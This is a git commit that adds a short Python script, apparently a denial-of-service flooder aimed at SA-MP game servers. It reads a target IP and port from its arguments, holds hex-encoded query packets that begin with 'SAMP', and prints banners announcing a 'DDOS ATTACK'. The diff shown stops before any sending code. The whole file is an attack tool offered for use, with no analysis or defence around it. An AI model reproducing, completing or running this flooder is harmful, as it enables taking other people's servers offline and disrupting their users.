edacfe7a76b12c4bc04987fdef1e08030a79d99d
Maestro <95646935+MaestroXyz@users.noreply.github.com>
2021-12-16 18:41:29 +0700

    Add files via upload

---
+++ kontol.py
@@ -0,0 +1,17 @@
+import socket, struct, codecs, sys, threading, random, time, os
+ip = sys.argv[1]
+port = sys.argv[2]
+orgip = ip
+Pacotes = [
+codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
+codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
+codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
+codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
+codecs.decode('081e62da', 'hex_codec'),
+codecs.decode('081e77da', 'hex_codec'),
+codecs.decode('081e4dda', 'hex_codec'),
+codecs.decode('081efd40', 'hex_codec'),
+codecs.decode('081e7eda', 'hex_codec')]
+print ' TOLS DDOS ATTACK BY FUNKY'
+print ' Attack By Funky '
+print ' Ez Down'
